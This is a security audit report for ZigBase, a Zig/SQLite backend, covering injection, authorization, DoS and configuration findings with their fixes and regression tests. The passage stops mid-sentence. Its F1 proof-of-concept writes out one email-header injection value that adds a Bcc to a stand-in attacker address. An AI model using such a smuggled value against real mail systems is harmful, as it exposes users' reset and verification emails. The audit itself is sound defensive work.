# ZigBase Security Audit

**Scope:** ZigBase v0.3.0 (single-binary PocketBase-style backend in Zig 0.16; SQLite-backed
REST + realtime + auth + file storage + embeddable framework).
**Date:** 2026-06-13.
**Perspectives:**

- **A — Stock ZigBase:** the shipped binary as deployed out-of-the-box.
- **B — Customized by a non-expert integrator:** hooks, custom routes, access rules, plugins —
  where the extension surface makes it easy to introduce a vulnerability.

Findings were addressed across the security workstream (each fix carries a regression test):
F1/F2 (mailer/email validation); F3, F4, F5 and the global WS-connection cap (access-control &
realtime authz, PR A); and F6, F8, F9 (perPage + multipart part caps), F10, F12 (deployment & DoS
hardening, PR B). The rest are written up as recommendations. Several items in
`KNOWN_LIMITATIONS.md` are re-assessed for severity rather than re-reported as novel.

---

## Executive summary

The query/SQL layer is genuinely strong: every value reaching SQLite is bound as a parameter,
and every interpolated identifier (table/column/index/alias name) is gated through
`schema.isValidIdentifier` (letters/digits/underscore, must start with a letter) *before* it can
reach DDL or a join. The offline `zigbase import` subcommand introduces no new threat surface: it
writes through the same record engine as the HTTP path (identical validation, defaults, and
`.encrypted` at-rest envelope), its `--collection`/`--upsert-key` identifiers pass the same
`isValidIdentifier` gate before interpolation while row values bind as parameters, and its
id-preservation is import-only (the HTTP/route/hook create path still always generates the id and
ignores any client-supplied one). The JWT implementation is header-pinned to HS256, verifies signatures in
constant time, and enforces `exp`. argon2id uses sane parameters. Password verify, CSRF, and
login-timing are all handled carefully. **No SQL-injection or auth-bypass was found in stock
ZigBase.**

The real exposure is at the **outbound and extension boundaries**: an unsanitized email-header
path (fixed here), an email field that accepted arbitrary control characters (fixed here), and a
set of **footguns for non-expert integrators** — chiefly that an empty-string access rule used to
mean *allow-all* while a `null` rule means *deny*, an easy way to misconfigure a collection wide
open. That trap is now **fixed** (F3): the access model is safe-by-default — a blank rule (`null`
or `""`) is locked to superusers, and the explicit sentinel `"@public"` is the only way to open a
collection (with a prominent startup warning for every one).

### Findings table

| ID | Title | Class | Severity | Persp. | Exploitability | Status |
|----|-------|-------|----------|--------|----------------|--------|
| F1 | SMTP/RFC5322 header injection via `to`/`subject`/`from` | SSRF/Injection | **High** | A+B | Moderate (needs a record with a crafted email + SMTP configured) | **Fixed** |
| F2 | Email field accepts CR/LF/NUL and bogus addresses | Injection / data integrity | **Med** | A | Low alone; enables F1 | **Fixed** |
| F3 | Empty-string rule = allow-all; `null` = deny (inverted-from-intuition default) | Authz | **Med** | B | n/a (misconfig trap) | **Fixed** |
| F4 | Realtime `delete` events use coarse authz (existence leak) | Authz / Realtime | Low | A | Low (id-only leak) | **Fixed** |
| F5 | WS subscribe does not require auth | Authz / Realtime | Low | A | Low (delivery still viewRule-gated) | **Fixed** |
| F6 | JWT secret has a usable insecure default in non-HTTPS mode | Auth/Config | Med | A | Conditional (dev default in prod-without-TLS) | **Fixed** |
| F7 | Verification/reset tokens are not explicitly single-use | Auth | Low | A | Low (rotation + 1h TTL mitigate) | **Fixed** |
| F8 | Rate limiter keyed on spoofable `X-Forwarded-For` on direct exposure | DoS | Med | A | Moderate (direct exposure only) | **Fixed** |
| F9 | No global WS connection cap / no per-field body limit | DoS | Low/Med | A | Moderate | **Fixed** (WS connection cap + perPage clamp + multipart part cap) |
| F10 | Static dir mode follows symlinks out of root | Path traversal | Low | A | Low (operator must plant the symlink) | **Fixed** |
| F11 | OAuth `state` is delegated to the client, not enforced server-side | Auth/OAuth | Low/Med | A | Low (redirect-URI allowlist + PKCE present) | **Fixed** (opt-in server-side store) |
| F12 | Insecure deployment defaults (bind `0.0.0.0`, `cookie_secure=false`, open WS origins) | Config | Med | A | n/a (posture) | **Fixed** |
| F13 | Unbounded pre-auth allocation from attacker-supplied JWT length | DoS | Med | A | Moderate (unauthenticated; body path allows a 50 MiB token) | **Fixed** |

Items deliberately re-assessed as **not exploitable**: rule **parse errors fail *closed*** (a
malformed rule yields a 500, the write never runs — see F3 notes); `expand` **does** re-apply the
target collection's `viewRule` per record; relation-path traversal is type-checked; multipart
filenames are sanitized; the static root percent-decodes the request path single-pass (in-house,
never recursively — so double-encoding cannot smuggle a `..`) **before** rejecting `..`/backslash/NUL
lexically, so encoded traversal (`%2e%2e`/`%2f`/`%00`/`%5c`) decodes and is then rejected fail-closed
while percent-encoded filenames stay servable; the F10 symlink guard runs afterward on the resolved path.

---

## Detailed findings

### F1 — SMTP / RFC5322 header injection (FIXED)

**Location:** `src/mail/mailer.zig` — `buildMessage` (was lines 351-357) and the SMTP command path
`runExchange` (`MAIL FROM` line ~197, `RCPT TO` line ~203).

**Description.** `email.to`, `email.subject`, and `self.from` were interpolated directly into the
`From:`/`To:`/`Subject:` RFC5322 headers and into the `MAIL FROM:<…>` / `RCPT TO:<…>` SMTP
command lines with **no CR/LF/NUL sanitization**. The values are reachable from attacker input:
`email.to` is the address a user supplies at signup or password-reset request, and the *mailer is
a public plugin entry point* (`Mailer.send`) that any integrator can call with arbitrary
`to`/`subject` (Perspective B). Before F2, the email field stored such values verbatim.

**PoC sketch.** Register / request reset with
`email = "victim@x.io\r\nBcc: attacker@evil.com"`. On the next send the message becomes:

```
To: victim@x.io
Bcc: attacker@evil.com
```

or, on the wire, an injected extra `RCPT TO:` / `DATA` — a header/command-injection that can BCC
an attacker, forge headers, or smuggle a second message body. Only effective once SMTP is
configured (the default `LogMailer` just logs), hence High rather than Critical.

**Fix.** Reject `\r`, `\n`, and NUL in `from`/`to`/`subject` at the mailer boundary
(`error.HeaderInjection`), in both `buildMessage` (headers) and `runExchange` (SMTP commands).
The message **body** is intentionally not checked — newlines there are legitimate data after the
header separator. Regression test: `buildMessage rejects CRLF header injection in to/subject/from`.

---

### F2 — Email field accepts control characters and bogus addresses (FIXED)

**Location:** `src/records.zig` — `validateFieldValue` (the `.email` field type previously fell
through to `else => {}`, i.e. **no validation at all**).

**Description.** An `email`-typed field accepted any string, including embedded `\r\n`/NUL and
addresses with no `@`. This is the *root enabler* of F1 (a record persisted with a CRLF address
re-injects on every later verification/reset send) and a general data-integrity problem.

**Fix.** Reject control chars (`\r`, `\n`, NUL) and spaces, and require a single `@` with
non-empty local and domain parts. This is intentionally *minimal* (not full RFC5322), but
it closes the injection class and the obviously-bogus cases. Clearing (empty/`null`) still works.
Regression test: `email field rejects control chars (CRLF/NUL) and obviously-bogus addresses`.

---

### F3 — Empty-string rule means allow-all; `null` means deny (Perspective B footgun) — FIXED

**Location:** `src/rules.zig` (`decide`).

```zig
pub fn decide(rule: ?[]const u8, rctx: *const request.RequestContext) Decision {
    if (rctx.is_superuser) return .allow;
    const r = rule orelse return .deny_locked;   // null  -> deny (superuser only)
    if (r.len == 0) return .allow;               // ""    -> allow ANYONE
    return .check;                               // expr  -> evaluate per record
}
```

**Description.** This matches PocketBase semantics and is internally consistent, **but it is a
classic misconfiguration trap for a non-expert.** `null` (locked / superuser-only) is the safe
state, yet "" (empty string) — which looks like "no rule / blank / safer" — actually opens the
collection to the entire internet. A developer who clears a rule field in the admin UI, or sets
`.listRule = ""` in a comptime schema "as a placeholder", has just made the collection public.
This is **not fail-open on errors** — a *malformed* rule string fails closed: `compileGuard`
returns a lex/parse error that propagates as a 500 and the write never runs (verified in
`src/api/records.zig:218,280` — the error short-circuits before `records.*Guarded`). The risk is
purely the *deliberate* empty-string-equals-public semantics.

**Impact.** Silent, total read/write exposure of a collection from a one-character config choice.
Combined with `expand` (which correctly re-applies the *target's* `viewRule`), an empty viewRule
on a related collection also makes it expandable by anyone.

**Fix (safe-by-default, breaking — pre-1.0).** `rules.decide` now treats a blank rule (`null` *or*
`""`) as `deny_locked` (superuser only), and an explicit new sentinel **`"@public"`** as the only
allow-all. Any other string is still compiled and checked per record. Implemented:

- `src/rules.zig`: `pub const public_sentinel = "@public"`, a `pub fn isPublic`, and the new
  `decide` semantics. The previous `r.len == 0 => .allow` trap is gone.
- Every site that special-cased an empty rule as public was made consistent:
  `src/api/files.zig` (cacheable-file header now keys on `rules.isPublic`), `src/realtime/hub.zig`
  / `src/realtime/ws.zig` (see F4/F5), `src/query/expand.zig` (public-target expand test).
- **Startup lint:** `src/provision.zig` `warnPublicRules` logs
  `collection 'X' is PUBLIC for <op> (anyone can <op>) — @public rule` for every `@public` rule at
  provision time, so a wide-open state is never silent (verified live on the golfsim example).
- **Admin UI** (`src/admin/app.js`, editable source present): the rule editor renders three
  distinct states — *Locked (admins only)* for `null`/`""`, *Expression…*, and *PUBLIC — anyone*
  (the `@public` sentinel) — with a `confirm()` before a rule can be set public.
- **Examples** migrated (`examples/{blog,golfsim,plugins}/src/main.zig`): every `""` that meant
  public became `"@public"` (public profiles/open signup; the golfsim simulators directory and
  public reviews; plugins authors and the open comment-create rule). Expression rules were left
  as-is.
- **Docs** updated (`docs/api.md`, `docs/framework.md`, `docs/recipes.md`, `docs/tutorial.md`):
  the value table, signup requirement, and rule-semantics prose now state "blank = Locked,
  `@public` = public."
- **Tests:** `decide` and `isPublic` unit tests (empty denies a non-superuser; `@public` allows
  anyone; an expression still checks per record; superuser still bypasses), plus a realtime
  "empty viewRule is now LOCKED" delivery test.

---

### F4 — Realtime `delete` events: coarse authorization (existence leak) — FIXED

**Location:** `src/realtime/hub.zig` (`shouldDeliver`).

```zig
if (action == .delete) {
    return rules.decide(col.viewRule, &rctx) != .deny_locked;
}
```

**Description.** For `create`/`update`, `shouldDeliver` re-evaluates the collection `viewRule`
(plus the subscription filter) **per record** via a guarded `SELECT` — correct and tight (tests
`macro viewRule: only the owner receives the record`). For `delete` the row is already gone, so
per-record re-authorization is impossible; the code delivers the delete (an id-only `{ "id": … }`
frame, no body) to **any** subscriber whose `viewRule` isn't `null`-locked. A subscriber with an
owner-scoped `viewRule` (e.g. `owner = @request.auth.id`) thus learns that *some* record id was
deleted even if it was never theirs to view.

**Impact.** Low — leaks only record *ids* and their deletion timing for non-locked collections;
no record contents.

**Fix.** The delete event is now authorized per subscriber against a **snapshot** of the deleted
row. The writer (`src/api/records.zig` `delete`) passes the row it already holds in `existing` into
`realtime_ws.broadcast`; `buildEventFrames` embeds it in the *published* delete frame under a
private key (`_deleteSnapshot`). `hub.shouldDeliver` for `delete` evaluates the collection's
`viewRule` against that snapshot in a throwaway in-memory DB (reusing the standard guarded-SELECT
machinery), so an owner-scoped collection only notifies subscribers who were allowed to view the
record. `onChannelMessage` strips the private snapshot and re-serializes an **id-only** frame
before delivery, so the snapshot never reaches a client. A `@public` viewRule still notifies anyone
(no snapshot needed); a `null`/locked one still notifies only superusers; with no snapshot the
delete is conservatively *not* delivered to `check`-state subscribers. Relation-traversing delete
rules deny (the temp DB has empty target tables) — a safe direction. Regression test:
`F4: owner-scoped delete only notifies the owner (snapshot authz)`.

---

### F5 — WS subscription does not require authentication — FIXED

**Location:** `src/realtime/ws.zig` (`.subscribe` handler).

**Description.** A socket could `.subscribe` to any existing collection before (or without) sending
`.auth`. This was *largely defanged* because delivery is still gated by `hub.shouldDeliver`, but it
allowed anonymous sockets to register subscriptions on gated data (and combined with F4's old
behavior, leak delete ids).

**Fix.** `.subscribe` now requires a live authenticated (or superuser) identity for any collection
whose `viewRule` is **not** `"@public"`. A public (`@public`) collection may still be subscribed
anonymously. The gate is a pure helper `subscribeAuthorized(view_rule, authed, is_superuser)` (so
it is unit-tested directly), and an unauthorized subscribe is rejected with
`{ "type": "error", "message": "authentication required to subscribe" }`. Per-record delivery
authorization (`shouldDeliver`) is unchanged, so this is a layered defense. Regression test:
`F5: anonymous subscribe allowed only on @public; gated collections require auth`.

---

### F6 — JWT secret insecure default usable in non-HTTPS mode (FIXED)

**Location:** `src/config.zig` (`jwt_secret` default), `src/framework.zig`
(`resolveJwtSecret`, called at the top of `serveImpl`).

**Description.** If `ZIGBASE_JWT_SECRET` was unset the binary used a well-known shared default
(`dev-insecure-secret-change-me`) and only **refused to start** when `cookie_secure` was enabled;
otherwise it booted with a `warn`. Anyone who knew the default could forge any auth/superuser JWT.

**Fix.** The shared default is gone. `Config.jwt_secret` now defaults to `""` meaning
"auto-generate". At startup `resolveJwtSecret`:
- if a secret is provided, **refuses to start** when it is shorter than 32 bytes
  (`min_jwt_secret_len`, `error.WeakJwtSecret`) — verified at runtime;
- if unset and `<data_dir>/.jwt_secret` exists (and is long enough), **reuses** the persisted
  secret;
- if unset and no file exists, **generates** a 64-char random secret (`crypto.genToken`) and
  **persists** it at `<data_dir>/.jwt_secret` with mode **0600**, never logging the value.

So "unset" now means a strong, per-deployment, persisted secret — never a shared guessable one.
Runtime evidence: a fresh `--data-dir` run logs "generated a new random JWT secret … (0600)" and
creates the 0600 file; a second run against the same dir logs "using persisted JWT secret" and
reuses it byte-for-byte.

---

### F7 — Verification / password-reset tokens not explicitly single-use (FIXED)

**Location:** `src/api/auth.zig` (confirm verification / confirm reset; `mintToken`);
`src/jwt.zig` (`Claims.jti`); `src/migrations.zig` (`0004_consumed_tokens`).

**Description.** Reset/verification tokens are signed JWTs with short TTLs (reset 1h, verify 7d)
and good entropy. Reuse was prevented only *incidentally*: confirming a reset rotates the user's
`tokenKey`, which invalidates the token's derived signing key — so a second confirm fails. There
was no explicit consumed-token store, so within the validity window before the legitimate user
acts, a leaked token could be redeemed (and, for verification, **re-redeemed** since verify does
not rotate the key).

**Fix.** Each verification/reset token now carries a random `jti` claim (minted in `mintToken`).
A new `_consumedTokens` table (migration `0004`, PRIMARY KEY on `jti`) records the `jti` on first
redemption. `consumeToken` performs an `INSERT` under the writer lock; a second redemption hits
the UNIQUE constraint and is rejected with `400` — strictly single-use, **independent of the
tokenKey-rotation side effect** and effective even within the TTL (the gap that let a verify token
replay). The reset path validates the new password *before* consuming, so a too-short password
does not burn the token. The table stores the token `exp` for later pruning. Regression tests:
*F7: a verification token cannot be redeemed twice*, *F7: a password-reset token cannot be
redeemed twice*, *F7: a too-short password does not consume the reset token*.

---

### F8 — Rate limiter keyed on spoofable `X-Forwarded-For` (FIXED)

**Location:** `src/config.zig` (`trust_proxy`), `src/server.zig` (`clientIpFrom`/`clientIp`),
`src/app.zig` (`trust_proxy` field), `src/ratelimit.zig` (unchanged).

**Description.** On **direct exposure** an attacker could spoof `X-Forwarded-For` per request and
bypass the login/reset/verify limiter, since `clientIp` always trusted those headers.

**Fix.** Added a config flag `trust_proxy` (default **false**; `--trust-proxy` /
`ZIGBASE_TRUST_PROXY`). `clientIpFrom(trust_proxy, xff, xri)` now returns `""` whenever
`trust_proxy` is false — `X-Forwarded-For`/`X-Real-IP` are ignored entirely — so the limiter
keys on the submitted identity, which is **not** header-spoofable. The proxy headers are honored
only when `trust_proxy` is set (the deployment is behind a trusted proxy that rewrites them).
This makes direct exposure safe by default. Regression test:
`clientIpFrom ignores X-Forwarded-For/X-Real-IP unless trust_proxy is set (F8)` (`src/server.zig`).
The limiter still **fails open** under memory pressure by design (it can't become a self-DoS), so
it remains a throttle, not a hard guarantee — documented in `KNOWN_LIMITATIONS.md`.

---

### F9 — No global WS connection cap; no per-field body limit (FIXED)

**Location:** `src/realtime/ws.zig:19` (per-conn `MAX_SUBS = 256`, but no global cap);
`src/records.zig` (`list` perPage clamp); `src/files/multipart.zig` (`max_parts`).

**Assessment.** Per-connection subscriptions are bounded (256) and the global body cap (50 MiB)
is enforced at the listener. Filter nesting is bounded at depth 32 (`query/parser.zig`).

**Fix.** All three memory-cost DoS caps are now enforced:
- **Global WS connection cap.** `src/realtime/ws.zig` holds `pub const MAX_CONNECTIONS = 10_000`
  (a realtime-layer constant, deliberately *not* in `config.zig`) and an atomic live-connection
  counter. `handleUpgrade` reserves a slot before allocating the connection and rejects upgrades
  past the cap with HTTP `503`; the slot is released on upgrade failure and on close. Tested pure
  helper (`reserveConnectionSlot`/`releaseConnectionSlot`). Regression test:
  `F9: global connection cap reserves/releases and rejects past MAX_CONNECTIONS`.
- **`perPage` clamp.** `records.list` clamps `perPage` to **500** (`@min(q.perPage, 500)`), so an
  oversized page can't drive a huge SQL `LIMIT` / allocation. Regression test (through the API
  handler): `list handler clamps an oversized perPage to the 500 cap (F9 DoS)` (`src/api/records.zig`).
- **Multipart part-count cap.** `multipart.parse` rejects a body with more than **1024** parts
  (`max_parts`, `error.BadMultipart`), so a 50 MiB body of many tiny parts can't force thousands
  of map insertions / file structs. Regression test:
  `a body exceeding the part-count cap is rejected (F9 DoS)` (`src/files/multipart.zig`).

A per-field body-size limit remains the one residual hardening (the global 50 MiB body cap bounds
the worst case).

---

### F10 — Static dir mode follows symlinks (FIXED)

**Location:** `src/static_files.zig` (`serveDir`, new `withinRoot` helper).

**Description.** The lexical path safety (`..`/backslash/NUL) is correct, but a symlink *inside*
the static root pointing outside it was followed (`statFile` follows symlinks), so a planted
symlink could expose files outside the configured root.

**Fix.** `serveDir` now canonicalizes both the configured root and the matched file with
`realPathFileAlloc` (which resolves every symlinked component) and refuses to serve anything whose
real path is not within the real root (`withinRoot`, a `/`-bounded prefix check so a sibling like
`/srv/wwwEVIL` is not treated as inside `/srv/www`). The lexical checks are kept as a cheap first
gate. Regression tests: `a symlink inside the root pointing OUTSIDE it is refused (F10)` (creates a
symlink in a temp root pointing at a file in a sibling dir and asserts a 404 while a legitimate
in-root file still serves) and `withinRoot: prefix must be '/'-bounded` (`src/static_files.zig`).

---

### F11 — OAuth `state` delegated to the client (FIXED — server-side store, on by default)

**Location:** `src/auth/methods/oauth2.zig` (`initiateImpl`/`completeImpl`),
`src/api/oauth.zig` (`issueState`/`consumeState`),
`src/config.zig` / `src/app.zig` (`oauth_state_server`, `oauth_state_ttl_s`),
`src/migrations.zig` (`0005_oauth_states`).

**Assessment.** ZigBase follows the PocketBase split: the **client** generates and checks the
`state`/PKCE pair and the SPA holds the verifier; the backend enforces (a) `redirect_url` against
a per-provider **exact-match allowlist** (`redirectAllowed`), (b) **https-only** effective
provider endpoints (`resolveProvider` → `isHttps`), and (c) requires the `codeVerifier` on
exchange (PKCE). CSRF on the OAuth flow therefore depended on the client honoring `state`.

**Fix.** Added a **server-side `state` store, on by default** (`oauth_state_server`, `bool = true`;
set `ZIGBASE_OAUTH_STATE_SERVER=false` to opt **out** and restore the client-only flow). When
active, `POST /api/collections/:col/auth/oauth2/initiate` mints a random `state` into `_oauthStates`
(migration `0005`, keyed by `state` with a TTL `expires`), scoped to (collection, provider).
`POST /api/collections/:col/auth/oauth2/complete` then **requires** a `state` in the body and
verifies+consumes it via a single `DELETE ... RETURNING` (single-use) **before** contacting the
provider — so a missing, mismatched, expired, or **replayed** state is rejected with `400` without
burning the authorization code. PKCE remains mandatory in both modes. The secure default was chosen
because most integrators can't guarantee a correct SPA; the opt-out lets a client that manages its
own CSRF `state` end-to-end keep the purely client-driven flow. Regression tests: *F11:
server-side state — valid accepted; missing/mismatched/replayed rejected*, *F11: initiate 404 when
server-side state disabled*, *F11: client-driven flow still works when server-side state is
disabled*. Docs: `docs/api.md` (OAuth2 → CSRF on the OAuth flow), `README.md` (env vars).

---

### F12 — Insecure deployment defaults (FIXED)

**Location:** `src/config.zig`, `src/cli.zig`, `src/framework.zig`, `src/realtime/ws.zig`,
`src/app.zig`.

The defaults are now secure-by-default (the project is pre-1.0; these are intentional breaking
changes, with quickstart docs/examples/tests updated to match):

- **Bind `127.0.0.1:8090`** (loopback) instead of `0.0.0.0`. Expose all interfaces explicitly with
  `--http-host 0.0.0.0` / `ZIGBASE_HTTP_HOST`; binding all interfaces logs a warning.
- **`cookie_secure = true`** (HTTPS-only auth cookies). Opt out for plain-HTTP local dev with
  `--insecure-cookies` / `ZIGBASE_COOKIE_SECURE=false`.
- **`realtime_allowed_origins = ""` now DENIES** cross-origin browser WS upgrades (an empty
  allowlist is no longer "allow any"). **Same-origin upgrades are always allowed** (the Origin
  authority equals the request `Host` — the embedded admin UI and any frontend served from the
  same binary; a malicious cross-site page cannot forge `Origin` to match, so this is CSRF-safe),
  so the common single-binary deployment needs no origin configuration. A request with no `Origin`
  header (non-browser client) is still allowed; set explicit origins (`--realtime-origins` /
  `ZIGBASE_REALTIME_ORIGINS`) only for a separate-origin browser app. `originAllowed(allowlist,
  origin, host)` enforces this (`src/realtime/ws.zig`, with updated tests).
- **`jwt_secret`** auto-generated + persisted (F6).

The quickstart in `README.md`, `docs/tutorial.md`, and the `examples/{blog,golfsim}` READMEs were
updated so copy-paste local runs still work under the new defaults (they pass `--insecure-cookies`).
The example frontends are served from the same binary, so their realtime is same-origin and needs
no `--realtime-origins` flag.

---

## Footguns for non-expert integrators (Perspective B)

The framework invites custom rules, hooks, routes, and plugins. The sharp edges:

1. **Empty-string rule = public (F3) — FIXED.** This was the single most likely way to ship a
   wide-open collection. Now safe-by-default: a blank rule (`null`/`""`) is Locked, and only the
   explicit `"@public"` sentinel opens a collection — with a startup lint warning on every one and
   distinct admin-UI wording (Locked / Expression / PUBLIC, confirmed before opening).
2. **The mailer plugin trusts its inputs (F1).** `Mailer.send(to, subject, body)` is a public
   vtable; an integrator wiring a custom route that emails user input would have injected headers.
   *Guardrail (now in place):* the built-in builder/SMTP path rejects CR/LF/NUL in headers, so even
   a custom mailer that reuses `buildMessage` is protected; a *fully custom* backend still must
   sanitize — document this.
3. **`before`-hook writes now fold into the write transaction — RESOLVED (shipped).** On the HTTP
   create/update/delete path, `before`-hooks run inside the write transaction: a
   `ctx.records().create(...)` side-write inside a hook commits or rolls back atomically with the
   triggering write — the correctness footgun described in earlier audit drafts is closed. Returning
   an error from the hook rolls back both the hook write and the triggering write. *Residual nuance:*
   hooks that acquire their own writer connection directly (e.g. calling `pool.acquireWriter()`
   manually) bypass the shared transaction context; the safe path is always `ctx.records()`, which
   reuses the bound in-transaction connection.
4. **Rule `@request.data.*` is evaluated pre-hook (in-code KNOWN LIMITATION at
   `api/records.zig:213`).** A create/update rule like `@request.data.role != "admin"` can be
   defeated if a before-hook *sets* `role` after the guard was compiled — the WHERE clause saw the
   pre-hook value. A non-expert writing both a hook and a data-referencing rule may assume they
   compose. *Guardrail:* document; or recompile the guard post-hook.
5. **Custom routes get a raw `Data` facade.** `Data.create/update/delete/list` run with **no
   access-rule enforcement** (they're the privileged escape hatch). An integrator who exposes a
   custom route backed by `Data.list("users", …)` without re-checking the caller's identity leaks
   the whole collection. *Guardrail:* name/document the facade as privileged; consider a
   rule-respecting variant (`Data.listAs(ctx, …)`) so the safe path is the easy path.
6. **Email/URL field "validation" is minimal.** Integrators may assume `email`/`url` fields are
   format-validated. After F2, `email` rejects control chars and the gross-bogus cases, but it is
   not full RFC validation. `text.pattern` is now enforced on every record write via an
   in-repo Thompson-NFA matcher (`src/regex.zig`) that is linear-time and DoS-safe (no
   catastrophic backtracking). `date` field `min`/`max` bounds are now enforced with date
   normalization (`src/datetime.zig`) so mixed formats compare correctly and garbage values
   are rejected. `url` validation remains minimal.
   *Guardrail:* document the exact guarantees.

---

## Hardening checklist for operators (stock ZigBase)

Several of these are now **the default** (marked ✓ done-by-default) after this PR; the rest remain
operator responsibilities.

- [x] **JWT secret — now automatic.** `ZIGBASE_JWT_SECRET` unset → a strong random secret is
      generated and persisted at `<data-dir>/.jwt_secret` (0600), reused thereafter; a provided
      secret < 32 bytes is refused. There is no shared default. Manage it yourself only if you want
      to (e.g. a secrets store) (F6).
- [ ] Terminate TLS in front. `cookie_secure` is **true by default** now; keep it on in production
      (only `--insecure-cookies` for plain-HTTP local dev).
- [x] **Bind — now loopback by default** (`127.0.0.1:8090`). Expose all interfaces only via
      `--http-host 0.0.0.0`, fronted by a firewall / reverse proxy (F12).
- [x] **Rate-limiter proxy headers — now ignored by default.** `X-Forwarded-For`/`X-Real-IP` are
      honored only with `--trust-proxy`; set it only behind a trusted reverse proxy. Direct
      exposure is safe by default (F8).
- [ ] Configure SMTP (`ZIGBASE_SMTP_*`) so verify/reset tokens are emailed, not logged. Leave
      `ZIGBASE_SMTP_INSECURE` off except for known self-signed relays.
- [x] **Realtime origins — empty now DENIES** cross-origin browser upgrades. Set
      `realtime_allowed_origins` / `--realtime-origins` to your app origin(s) to allow them (F12).
- [ ] Audit every collection's list/view/create/update/delete rules. Only the explicit
      **`"@public"`** sentinel is "public to the entire internet" — confirm each one is intended
      (ZigBase logs a startup warning for every `@public` rule). A blank rule (`null`/`""`) is
      Locked to superusers (F3).
- [x] **Static symlink escapes — now refused** (served files are canonicalized and must remain
      within the static root) (F10). Planting such a symlink is no longer a leak.
- [ ] **S3 presigned-redirect serving is opt-in and off by default.** Enabling
      `App(.{ .files = .{ .s3_presign_redirect = true } })` serves authorized downloads as a 302 to
      a presigned GET URL. Per-request authorization still runs **before** the URL is issued, but the
      issued URL is a **time-limited bearer capability**: valid for `s3_presign_ttl_s` (default 900s)
      and **not** bound to the authorized requester, so anyone the URL is shared with can fetch the
      object until it expires. Keep the TTL short; leave this off if per-request authorization on
      every byte is required.
- [ ] Set a Sentry DSN if you want errors captured off-box; error responses to clients are already
      generic (no stack traces / SQL leaked — verified in `src/api/error.zig`).

---

## What was fixed

Access-control & realtime authz (PR A):

- **F1 / F2** (original audit PR): mailer header/command injection + email-field control-char
  validation, with two regression tests (`src/mail/mailer.zig`, `src/records.zig`).
- **F3** — safe-by-default access rules: blank (`null`/`""`) = Locked; explicit `"@public"` =
  allow-all; startup lint; admin-UI three-state editor; examples + docs migrated.
- **F4** — realtime delete events authorized against a per-record deletion snapshot (owner-scoped
  collections no longer leak delete ids to unauthorized subscribers).
- **F5** — WS `subscribe` requires auth for any non-`@public` collection.
- **F9 (WS-cap portion)** — global concurrent-WebSocket-connection cap (`MAX_CONNECTIONS = 10_000`)
  enforced at upgrade; over-cap upgrades get `503`.

Deployment & DoS hardening (PR B):

- **F6 / F12 — secure-by-default config:** loopback bind (`127.0.0.1`), `cookie_secure=true`,
  auto-generated + persisted JWT secret (0600, ≥32-byte minimum on provided secrets), empty
  realtime origins = deny cross-origin browser upgrades. New opt-out/opt-in flags
  `--insecure-cookies`, `--trust-proxy`, `--realtime-origins`, plus `--http-host 0.0.0.0` to
  expose. Quickstart docs/examples/tests updated.
- **F8 — `trust_proxy` (default false):** `X-Forwarded-For`/`X-Real-IP` ignored unless trusted.
- **F9 — DoS caps:** `perPage` clamped to 500; multipart bodies capped at 1024 parts.
- **F10 — static symlink escape:** served files canonicalized and verified within the static root.

Auth token lifecycle & OAuth (PR C):

- **F7** — strictly single-use verification/reset tokens via a random `jti` claim recorded in a new
  `_consumedTokens` table (migration `0004`), enforced in the confirm handlers — independent of the
  tokenKey-rotation side effect. Three regression tests.
- **F11** — **server-side OAuth `state`** store, **on by default** (migration `0005`,
  `/auth/oauth2/initiate` endpoint, `ZIGBASE_OAUTH_STATE_SERVER=false` to opt out), single-use and
  verified before the provider exchange. Three regression tests; docs updated.

All of the above ship with regression tests; `zig build` succeeds and all unit tests pass.

The one residual hardening (a per-field body-size limit within the global 50 MiB body cap) is left
as a recommendation and intentionally **not** half-implemented here.

## Dependency version transparency & supply-chain auditing

A ZigBase binary bakes in a **vendored SQLite C amalgamation** (`vendor/sqlite`), an optional
**sqlite-vec** amalgamation (`vendor/sqlite-vec`, only with `-Dvector`), and the **`zap`/facil.io**
HTTP server (fetched via `build.zig.zon`). Because these are compiled in, an operator needs a way to
know *which* versions a given binary ships and to check them against known advisories. ZigBase
surfaces the pinned versions on four channels and ships an in-repo audit path (#282).

### Where the versions come from (single source of truth)

At **configure time**, `build.zig` aggregates the pinned versions into `build_options` (zero runtime
cost — each becomes a compiled-in string constant):

- **SQLite** — read straight from `#define SQLITE_VERSION` / `SQLITE_SOURCE_ID` in
  `vendor/sqlite/sqlite3.h`, so a bumped amalgamation flows through automatically.
- **sqlite-vec** — read from `#define SQLITE_VEC_VERSION` in `vendor/sqlite-vec/sqlite-vec.h`
  (reported as "not linked" unless the binary was built with `-Dvector`).
- **zap** — version is a curated constant kept in sync with the `build.zig.zon` pin; the exact
  commit is parsed from the dependency URL.
- **facil.io** — a curated constant. facil.io ships *bundled inside* the pinned `zap` and has no
  in-tree header, so it is tied to the `zap` pin and bumped whenever `zap` is re-pinned.
- **zigbase** itself — `.version` from `build.zig.zon`, plus the git commit captured at build time.

### Transparency surfaces

- **`zigbase --version`** — prints the build provenance *and* a "Vendored/native components" block
  (SQLite + source id, sqlite-vec + linked/not-linked note, zap + commit, facil.io).
- **`zig build versions`** — a build step that runs the freshly-built binary with `--version`, so a
  contributor can read the exact versions a build would ship without launching a server.
- **Startup log** — `zigbase serve` emits a single `versions: …` `INFO` line at boot, so an
  operator can audit a *running* binary from its logs. `sqlite` here is the **live linked** version
  (`sqlite3_libversion()`), which must match the vendored header.
- **`GET /api/health`** — returns a `versions` object alongside the backend badge:
  `{"status":"ok","backend":"sqlite","versions":{"zigbase":"…","commit":"…","sqlite":"…","sqliteVec":"…","zap":"…","facil":"…"}}`.
  These are non-secret build provenance only — no connection string, host, path, or credential is
  ever exposed here (same discipline as the `backend` badge).

### The `zig build audit` workflow

`zig build audit` runs `scripts/audit-deps.sh`, which:

1. Resolves the pinned version of each dependency from the **same sources** the build uses
   (the vendored headers, the curated `zap`/facil.io constants, and `build.zig.zon`).
2. Parses the curated advisory table in **`docs/security-advisories.md`**.
3. Flags a dependency as **AFFECTED** (and exits non-zero) if its pinned version is strictly below
   the `Min safe version` of any advisory row; prints an OK report and exits 0 otherwise.

The advisory table is **manually curated** — advisories are not machine-discoverable from inside the
repo, so a human adds a row when a relevant CVE lands. The header comment in
`docs/security-advisories.md` documents the row format and the update rules. Two real historical
SQLite CVEs are seeded as worked examples (the current 3.53.2 pin sits safely above both fixed-in
versions, so they report OK) to demonstrate the mechanism honestly.

### Update process for a vendored C / dependency security fix

When SQLite, sqlite-vec, `zap`, or facil.io publishes a security release:

1. **Bump the dependency.**
   - *SQLite / sqlite-vec:* replace the vendored amalgamation under `vendor/` with the fixed
